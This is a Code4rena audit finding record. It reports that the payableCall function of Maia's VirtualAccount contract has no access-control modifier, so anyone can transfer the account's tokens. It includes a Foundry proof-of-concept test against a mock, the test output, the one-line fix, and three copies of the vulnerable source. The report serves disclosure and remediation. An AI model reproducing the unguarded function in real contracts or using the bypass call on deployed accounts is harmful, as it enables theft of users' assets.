{
  "Title": "[H-01] All tokens can be stolen from `VirtualAccount` due to missing access modifier",
  "Content": "\nAll non-native assets (ERC20 tokens, NFTs, etc.) can be stolen by anyone from a `VirtualAccount` using its [`payableCall(...)`](https://github.com/code-423n4/2023-09-maia/blob/f5ba4de628836b2a29f9b5fff59499690008c463/src/VirtualAccount.sol#L84-L112) method, which lacks the necessary access control modifier [`requiresApprovedCaller`](https://github.com/code-423n4/2023-09-maia/blob/f5ba4de628836b2a29f9b5fff59499690008c463/src/VirtualAccount.sol#L159-L167). See also, the [call(...)](https://github.com/code-423n4/2023-09-maia/blob/f5ba4de628836b2a29f9b5fff59499690008c463/src/VirtualAccount.sol#L65-L82) method which utilizes the [`requiresApprovedCaller`](https://github.com/code-423n4/2023-09-maia/blob/f5ba4de628836b2a29f9b5fff59499690008c463/src/VirtualAccount.sol#L159-L167) modifier.\n\nTherefore, an attacker can craft a call to e.g. `ERC20.transfer(...)` on behalf of the contract, like the [withdrawERC20(...)](https://github.com/code-423n4/2023-09-maia/blob/f5ba4de628836b2a29f9b5fff59499690008c463/src/VirtualAccount.sol#L55-L58) method does, while bypassing access control by executing the call via [`payableCall(...)`](https://github.com/code-423n4/2023-09-maia/blob/f5ba4de628836b2a29f9b5fff59499690008c463/src/VirtualAccount.sol#L84-L112).\n\nAs a consequence, all non-native assets of the `VirtualAccount` can be stolen by anyone causing a loss for its owner.\n\n### Proof of Concept\n\nAdd the code below as a new test file `test/ulysses-omnichain/VirtualAccount.t.sol` and run it using `forge test -vv --match-contract VirtualAccountTest` in order to verify the above claims:\n\n```solidity\n//SPDX-License-Identifier: AGPL-3.0-only\npragma solidity ^0.8.0;\n\nimport {VirtualAccount} from \"@omni/VirtualAccount.sol\";\nimport {PayableCall} from \"@omni/interfaces/IVirtualAccount.sol\";\n\nimport {ERC20} from \"solmate/tokens/ERC20.sol\";\n\nimport \"./helpers/ImportHelper.sol\";\n\n\ncontract VirtualAccountTest is Test {\n\n    address public alice;\n    address public bob;\n\n    VirtualAccount public vAcc;\n\n    function setUp() public {\n        alice = makeAddr(\"Alice\");\n        bob = makeAddr(\"Bob\");\n\n        // create new VirtualAccount for user Alice and this test contract as mock local port\n        vAcc = new VirtualAccount(alice, address(this));\n    }\n\n    function testWithdrawERC20_AliceSuccess() public {\n        vm.prank(alice);\n        vAcc.withdrawERC20(address(this), 1); // caller is authorized\n    }\n\n    function testWithdrawERC20_BobFailure() public {\n        vm.prank(bob);\n        vm.expectRevert();\n        vAcc.withdrawERC20(address(this), 1); // caller is not authorized\n    }\n\n    function testWithdrawERC20_BobBypassSuccess() public {\n        PayableCall[] memory calls = new PayableCall[](1);\n        calls[0].target = address(this);\n        calls[0].callData = abi.encodeCall(ERC20.transfer, (bob, 1));\n\n        vm.prank(bob);\n        vAcc.payableCall(calls); // caller is not authorized but it does't matter\n    }\n\n\n    // mock VirtualAccount call to local port\n    function isRouterApproved(VirtualAccount _userAccount, address _router) external returns (bool) {\n        return false;\n    }\n    \n    // mock ERC20 token transfer\n    function transfer(address to, uint256 value) external returns (bool) {\n        console2.log(\"Transferred %s from %s to %s\", value, msg.sender, to);\n        return true;\n    }\n}\n```\n\nOutput:\n\n```shell\nRunning 3 tests for test/ulysses-omnichain/VirtualAccount.t.sol:VirtualAccountTest\n[PASS] testWithdrawERC20_AliceSuccess() (gas: 15428)\nLogs:\n  Transferred 1 from 0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f to 0xBf0b5A4099F0bf6c8bC4252eBeC548Bae95602Ea\n\n[PASS] testWithdrawERC20_BobBypassSuccess() (gas: 18727)\nLogs:\n  Transferred 1 from 0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f to 0x4dBa461cA9342F4A6Cf942aBd7eacf8AE259108C\n\n[PASS] testWithdrawERC20_BobFailure() (gas: 12040)\nTest result: ok. 3 passed; 0 failed; 0 skipped; finished in 1.11ms\n```\n\n### Recommended Mitigation Steps\n\nAdd the missing [`requiresApprovedCaller`](https://github.com/code-423n4/2023-09-maia/blob/f5ba4de628836b2a29f9b5fff59499690008c463/src/VirtualAccount.sol#L159-L167) modifier to the [`payableCall(...)`](https://github.com/code-423n4/2023-09-maia/blob/f5ba4de628836b2a29f9b5fff59499690008c463/src/VirtualAccount.sol#L84-L112) method:\n\n```diff\ndiff --git a/src/VirtualAccount.sol b/src/VirtualAccount.sol\nindex f6a9134..49a679a 100644\n--- a/src/VirtualAccount.sol\n+++ b/src/VirtualAccount.sol\n@@ -82,7 +82,7 @@ contract VirtualAccount is IVirtualAccount, ERC1155Receiver {\n     }\n \n     /// @inheritdoc IVirtualAccount\n-    function payableCall(PayableCall[] calldata calls) public payable returns (bytes[] memory returnData) {\n+    function payableCall(PayableCall[] calldata calls) public payable requiresApprovedCaller returns (bytes[] memory returnData) {\n         uint256 valAccumulator;\n         uint256 length = calls.length;\n         returnData = new bytes[](length);\n```\n\n### Assessed type\n\nAccess Control\n\n**[0xLightt (Maia) confirmed](https://github.com/code-423n4/2023-09-maia-findings/issues/885#issuecomment-1787989558)**\n\n**[0xBugsy (Maia) commented](https://github.com/code-423n4/2023-09-maia-findings/issues/885#issuecomment-1796417864):**\n > Issue addressed [here](https://github.com/Maia-DAO/2023-09-maia-remediations/commit/2209d6e96af986fa0960aacc356ba2be070fdc85).\n\n***\n\n",
  "Impact": "HIGH",
  "Source": "https://code4rena.com/reports/2023-09-maia",
  "Code": [
    {
      "filename": "src/VirtualAccount.sol",
      "content": "// SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\nimport {SafeTransferLib} from \"solady/utils/SafeTransferLib.sol\";\n\nimport {ERC721} from \"solmate/tokens/ERC721.sol\";\n\nimport {ERC1155Receiver} from \"@openzeppelin/contracts/token/ERC1155/utils/ERC1155Receiver.sol\";\nimport {IERC1155Receiver} from \"@openzeppelin/contracts/token/ERC1155/IERC1155Receiver.sol\";\nimport {IERC721Receiver} from \"@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol\";\n\nimport {IVirtualAccount, Call, PayableCall} from \"./interfaces/IVirtualAccount.sol\";\nimport {IRootPort} from \"./interfaces/IRootPort.sol\";\n\n/// @title VirtualAccount - Contract for managing a virtual user account on the Root Chain\ncontract VirtualAccount is IVirtualAccount, ERC1155Receiver {\n    using SafeTransferLib for address;\n\n    /// @inheritdoc IVirtualAccount\n    address public immutable override userAddress;\n\n    /// @inheritdoc IVirtualAccount\n    address public immutable override localPortAddress;\n\n    /*//////////////////////////////////////////////////////////////\n                            CONSTRUCTOR\n    //////////////////////////////////////////////////////////////*/\n\n    /**\n     * @notice Constructor for Virtual Account.\n     * @param _userAddress Address of the user account.\n     * @param _localPortAddress Address of the root port contract.\n     */\n    constructor(address _userAddress, address _localPortAddress) {\n        userAddress = _userAddress;\n        localPortAddress = _localPortAddress;\n    }\n\n    /*//////////////////////////////////////////////////////////////\n                            FALLBACK FUNCTIONS\n    //////////////////////////////////////////////////////////////*/\n\n    receive() external payable {}\n\n    /*//////////////////////////////////////////////////////////////\n                            EXTERNAL FUNCTIONS\n    //////////////////////////////////////////////////////////////*/\n\n    /// @inheritdoc IVirtualAccount\n    function withdrawNative(uint256 _amount) external override requiresApprovedCaller {\n        msg.sender.safeTransferETH(_amount);\n    }\n\n    /// @inheritdoc IVirtualAccount\n    function withdrawERC20(address _token, uint256 _amount) external override requiresApprovedCaller {\n        _token.safeTransfer(msg.sender, _amount);\n    }\n\n    /// @inheritdoc IVirtualAccount\n    function withdrawERC721(address _token, uint256 _tokenId) external override requiresApprovedCaller {\n        ERC721(_token).transferFrom(address(this), msg.sender, _tokenId);\n    }\n\n    /// @inheritdoc IVirtualAccount\n    function call(Call[] calldata calls) external override requiresApprovedCaller returns (bytes[] memory returnData) {\n        uint256 length = calls.length;\n        returnData = new bytes[](length);\n\n        for (uint256 i = 0; i < length;) {\n            bool success;\n            Call calldata _call = calls[i];\n\n            if (isContract(_call.target)) (success, returnData[i]) = _call.target.call(_call.callData);\n\n            if (!success) revert CallFailed();\n\n            unchecked {\n                ++i;\n            }\n        }\n    }\n\n    /// @inheritdoc IVirtualAccount\n    function payableCall(PayableCall[] calldata calls) public payable returns (bytes[] memory returnData) {\n        uint256 valAccumulator;\n        uint256 length = calls.length;\n        returnData = new bytes[](length);\n        PayableCall calldata _call;\n        for (uint256 i = 0; i < length;) {\n            _call = calls[i];\n            uint256 val = _call.value;\n            // Humanity will be a Type V Kardashev Civilization before this overflows - andreas\n            // ~ 10^25 Wei in existence << ~ 10^76 size uint fits in a uint256\n            unchecked {\n                valAccumulator += val;\n            }\n\n            bool success;\n\n            if (isContract(_call.target)) (success, returnData[i]) = _call.target.call{value: val}(_call.callData);\n\n            if (!success) revert CallFailed();\n\n            unchecked {\n                ++i;\n            }\n        }\n\n        // Finally, make sure the msg.value = SUM(call[0...i].value)\n        if (msg.value != valAccumulator) revert CallFailed();\n    }\n\n    /*//////////////////////////////////////////////////////////////\n                            EXTERNAL HOOKS\n    //////////////////////////////////////////////////////////////*/\n\n    /// @inheritdoc IERC721Receiver\n    function onERC721Received(address, address, uint256, bytes calldata) external pure override returns (bytes4) {\n        return this.onERC721Received.selector;\n    }\n\n    /// @inheritdoc IERC1155Receiver\n    function onERC1155Received(address, address, uint256, uint256, bytes calldata)\n        external\n        pure\n        override\n        returns (bytes4)\n    {\n        return this.onERC1155Received.selector;\n    }\n\n    /// @inheritdoc IERC1155Receiver\n    function onERC1155BatchReceived(address, address, uint256[] calldata, uint256[] calldata, bytes calldata)\n        external\n        pure\n        override\n        returns (bytes4)\n    {\n        return this.onERC1155BatchReceived.selector;\n    }\n\n    /*//////////////////////////////////////////////////////////////\n                            INTERNAL HELPERS\n    //////////////////////////////////////////////////////////////*/\n\n    function isContract(address addr) internal view returns (bool) {\n        uint256 size;\n        assembly {\n            size := extcodesize(addr)\n        }\n        return size > 0;\n    }\n\n    /*///////////////////////////////////////////////////////////////\n                                MODIFIERS\n    //////////////////////////////////////////////////////////////*/\n\n    /// @notice Modifier that verifies msg sender is the approved to use the virtual account. Either the owner or an approved router.\n    modifier requiresApprovedCaller() {\n        if (!IRootPort(localPortAddress).isRouterApproved(this, msg.sender)) {\n            if (msg.sender != userAddress) {\n                revert UnauthorizedCaller();\n            }\n        }\n        _;\n    }\n}"
    },
    {
      "filename": "src/VirtualAccount.sol",
      "content": "// SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\nimport {SafeTransferLib} from \"solady/utils/SafeTransferLib.sol\";\n\nimport {ERC721} from \"solmate/tokens/ERC721.sol\";\n\nimport {ERC1155Receiver} from \"@openzeppelin/contracts/token/ERC1155/utils/ERC1155Receiver.sol\";\nimport {IERC1155Receiver} from \"@openzeppelin/contracts/token/ERC1155/IERC1155Receiver.sol\";\nimport {IERC721Receiver} from \"@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol\";\n\nimport {IVirtualAccount, Call, PayableCall} from \"./interfaces/IVirtualAccount.sol\";\nimport {IRootPort} from \"./interfaces/IRootPort.sol\";\n\n/// @title VirtualAccount - Contract for managing a virtual user account on the Root Chain\ncontract VirtualAccount is IVirtualAccount, ERC1155Receiver {\n    using SafeTransferLib for address;\n\n    /// @inheritdoc IVirtualAccount\n    address public immutable override userAddress;\n\n    /// @inheritdoc IVirtualAccount\n    address public immutable override localPortAddress;\n\n    /*//////////////////////////////////////////////////////////////\n                            CONSTRUCTOR\n    //////////////////////////////////////////////////////////////*/\n\n    /**\n     * @notice Constructor for Virtual Account.\n     * @param _userAddress Address of the user account.\n     * @param _localPortAddress Address of the root port contract.\n     */\n    constructor(address _userAddress, address _localPortAddress) {\n        userAddress = _userAddress;\n        localPortAddress = _localPortAddress;\n    }\n\n    /*//////////////////////////////////////////////////////////////\n                            FALLBACK FUNCTIONS\n    //////////////////////////////////////////////////////////////*/\n\n    receive() external payable {}\n\n    /*//////////////////////////////////////////////////////////////\n                            EXTERNAL FUNCTIONS\n    //////////////////////////////////////////////////////////////*/\n\n    /// @inheritdoc IVirtualAccount\n    function withdrawNative(uint256 _amount) external override requiresApprovedCaller {\n        msg.sender.safeTransferETH(_amount);\n    }\n\n    /// @inheritdoc IVirtualAccount\n    function withdrawERC20(address _token, uint256 _amount) external override requiresApprovedCaller {\n        _token.safeTransfer(msg.sender, _amount);\n    }\n\n    /// @inheritdoc IVirtualAccount\n    function withdrawERC721(address _token, uint256 _tokenId) external override requiresApprovedCaller {\n        ERC721(_token).transferFrom(address(this), msg.sender, _tokenId);\n    }\n\n    /// @inheritdoc IVirtualAccount\n    function call(Call[] calldata calls) external override requiresApprovedCaller returns (bytes[] memory returnData) {\n        uint256 length = calls.length;\n        returnData = new bytes[](length);\n\n        for (uint256 i = 0; i < length;) {\n            bool success;\n            Call calldata _call = calls[i];\n\n            if (isContract(_call.target)) (success, returnData[i]) = _call.target.call(_call.callData);\n\n            if (!success) revert CallFailed();\n\n            unchecked {\n                ++i;\n            }\n        }\n    }\n\n    /// @inheritdoc IVirtualAccount\n    function payableCall(PayableCall[] calldata calls) public payable returns (bytes[] memory returnData) {\n        uint256 valAccumulator;\n        uint256 length = calls.length;\n        returnData = new bytes[](length);\n        PayableCall calldata _call;\n        for (uint256 i = 0; i < length;) {\n            _call = calls[i];\n            uint256 val = _call.value;\n            // Humanity will be a Type V Kardashev Civilization before this overflows - andreas\n            // ~ 10^25 Wei in existence << ~ 10^76 size uint fits in a uint256\n            unchecked {\n                valAccumulator += val;\n            }\n\n            bool success;\n\n            if (isContract(_call.target)) (success, returnData[i]) = _call.target.call{value: val}(_call.callData);\n\n            if (!success) revert CallFailed();\n\n            unchecked {\n                ++i;\n            }\n        }\n\n        // Finally, make sure the msg.value = SUM(call[0...i].value)\n        if (msg.value != valAccumulator) revert CallFailed();\n    }\n\n    /*//////////////////////////////////////////////////////////////\n                            EXTERNAL HOOKS\n    //////////////////////////////////////////////////////////////*/\n\n    /// @inheritdoc IERC721Receiver\n    function onERC721Received(address, address, uint256, bytes calldata) external pure override returns (bytes4) {\n        return this.onERC721Received.selector;\n    }\n\n    /// @inheritdoc IERC1155Receiver\n    function onERC1155Received(address, address, uint256, uint256, bytes calldata)\n        external\n        pure\n        override\n        returns (bytes4)\n    {\n        return this.onERC1155Received.selector;\n    }\n\n    /// @inheritdoc IERC1155Receiver\n    function onERC1155BatchReceived(address, address, uint256[] calldata, uint256[] calldata, bytes calldata)\n        external\n        pure\n        override\n        returns (bytes4)\n    {\n        return this.onERC1155BatchReceived.selector;\n    }\n\n    /*//////////////////////////////////////////////////////////////\n                            INTERNAL HELPERS\n    //////////////////////////////////////////////////////////////*/\n\n    function isContract(address addr) internal view returns (bool) {\n        uint256 size;\n        assembly {\n            size := extcodesize(addr)\n        }\n        return size > 0;\n    }\n\n    /*///////////////////////////////////////////////////////////////\n                                MODIFIERS\n    //////////////////////////////////////////////////////////////*/\n\n    /// @notice Modifier that verifies msg sender is the approved to use the virtual account. Either the owner or an approved router.\n    modifier requiresApprovedCaller() {\n        if (!IRootPort(localPortAddress).isRouterApproved(this, msg.sender)) {\n            if (msg.sender != userAddress) {\n                revert UnauthorizedCaller();\n            }\n        }\n        _;\n    }\n}"
    },
    {
      "filename": "src/VirtualAccount.sol",
      "content": "// SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\nimport {SafeTransferLib} from \"solady/utils/SafeTransferLib.sol\";\n\nimport {ERC721} from \"solmate/tokens/ERC721.sol\";\n\nimport {ERC1155Receiver} from \"@openzeppelin/contracts/token/ERC1155/utils/ERC1155Receiver.sol\";\nimport {IERC1155Receiver} from \"@openzeppelin/contracts/token/ERC1155/IERC1155Receiver.sol\";\nimport {IERC721Receiver} from \"@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol\";\n\nimport {IVirtualAccount, Call, PayableCall} from \"./interfaces/IVirtualAccount.sol\";\nimport {IRootPort} from \"./interfaces/IRootPort.sol\";\n\n/// @title VirtualAccount - Contract for managing a virtual user account on the Root Chain\ncontract VirtualAccount is IVirtualAccount, ERC1155Receiver {\n    using SafeTransferLib for address;\n\n    /// @inheritdoc IVirtualAccount\n    address public immutable override userAddress;\n\n    /// @inheritdoc IVirtualAccount\n    address public immutable override localPortAddress;\n\n    /*//////////////////////////////////////////////////////////////\n                            CONSTRUCTOR\n    //////////////////////////////////////////////////////////////*/\n\n    /**\n     * @notice Constructor for Virtual Account.\n     * @param _userAddress Address of the user account.\n     * @param _localPortAddress Address of the root port contract.\n     */\n    constructor(address _userAddress, address _localPortAddress) {\n        userAddress = _userAddress;\n        localPortAddress = _localPortAddress;\n    }\n\n    /*//////////////////////////////////////////////////////////////\n                            FALLBACK FUNCTIONS\n    //////////////////////////////////////////////////////////////*/\n\n    receive() external payable {}\n\n    /*//////////////////////////////////////////////////////////////\n                            EXTERNAL FUNCTIONS\n    //////////////////////////////////////////////////////////////*/\n\n    /// @inheritdoc IVirtualAccount\n    function withdrawNative(uint256 _amount) external override requiresApprovedCaller {\n        msg.sender.safeTransferETH(_amount);\n    }\n\n    /// @inheritdoc IVirtualAccount\n    function withdrawERC20(address _token, uint256 _amount) external override requiresApprovedCaller {\n        _token.safeTransfer(msg.sender, _amount);\n    }\n\n    /// @inheritdoc IVirtualAccount\n    function withdrawERC721(address _token, uint256 _tokenId) external override requiresApprovedCaller {\n        ERC721(_token).transferFrom(address(this), msg.sender, _tokenId);\n    }\n\n    /// @inheritdoc IVirtualAccount\n    function call(Call[] calldata calls) external override requiresApprovedCaller returns (bytes[] memory returnData) {\n        uint256 length = calls.length;\n        returnData = new bytes[](length);\n\n        for (uint256 i = 0; i < length;) {\n            bool success;\n            Call calldata _call = calls[i];\n\n            if (isContract(_call.target)) (success, returnData[i]) = _call.target.call(_call.callData);\n\n            if (!success) revert CallFailed();\n\n            unchecked {\n                ++i;\n            }\n        }\n    }\n\n    /// @inheritdoc IVirtualAccount\n    function payableCall(PayableCall[] calldata calls) public payable returns (bytes[] memory returnData) {\n        uint256 valAccumulator;\n        uint256 length = calls.length;\n        returnData = new bytes[](length);\n        PayableCall calldata _call;\n        for (uint256 i = 0; i < length;) {\n            _call = calls[i];\n            uint256 val = _call.value;\n            // Humanity will be a Type V Kardashev Civilization before this overflows - andreas\n            // ~ 10^25 Wei in existence << ~ 10^76 size uint fits in a uint256\n            unchecked {\n                valAccumulator += val;\n            }\n\n            bool success;\n\n            if (isContract(_call.target)) (success, returnData[i]) = _call.target.call{value: val}(_call.callData);\n\n            if (!success) revert CallFailed();\n\n            unchecked {\n                ++i;\n            }\n        }\n\n        // Finally, make sure the msg.value = SUM(call[0...i].value)\n        if (msg.value != valAccumulator) revert CallFailed();\n    }\n\n    /*//////////////////////////////////////////////////////////////\n                            EXTERNAL HOOKS\n    //////////////////////////////////////////////////////////////*/\n\n    /// @inheritdoc IERC721Receiver\n    function onERC721Received(address, address, uint256, bytes calldata) external pure override returns (bytes4) {\n        return this.onERC721Received.selector;\n    }\n\n    /// @inheritdoc IERC1155Receiver\n    function onERC1155Received(address, address, uint256, uint256, bytes calldata)\n        external\n        pure\n        override\n        returns (bytes4)\n    {\n        return this.onERC1155Received.selector;\n    }\n\n    /// @inheritdoc IERC1155Receiver\n    function onERC1155BatchReceived(address, address, uint256[] calldata, uint256[] calldata, bytes calldata)\n        external\n        pure\n        override\n        returns (bytes4)\n    {\n        return this.onERC1155BatchReceived.selector;\n    }\n\n    /*//////////////////////////////////////////////////////////////\n                            INTERNAL HELPERS\n    //////////////////////////////////////////////////////////////*/\n\n    function isContract(address addr) internal view returns (bool) {\n        uint256 size;\n        assembly {\n            size := extcodesize(addr)\n        }\n        return size > 0;\n    }\n\n    /*///////////////////////////////////////////////////////////////\n                                MODIFIERS\n    //////////////////////////////////////////////////////////////*/\n\n    /// @notice Modifier that verifies msg sender is the approved to use the virtual account. Either the owner or an approved router.\n    modifier requiresApprovedCaller() {\n        if (!IRootPort(localPortAddress).isRouterApproved(this, msg.sender)) {\n            if (msg.sender != userAddress) {\n                revert UnauthorizedCaller();\n            }\n        }\n        _;\n    }\n}"
    }
  ]
}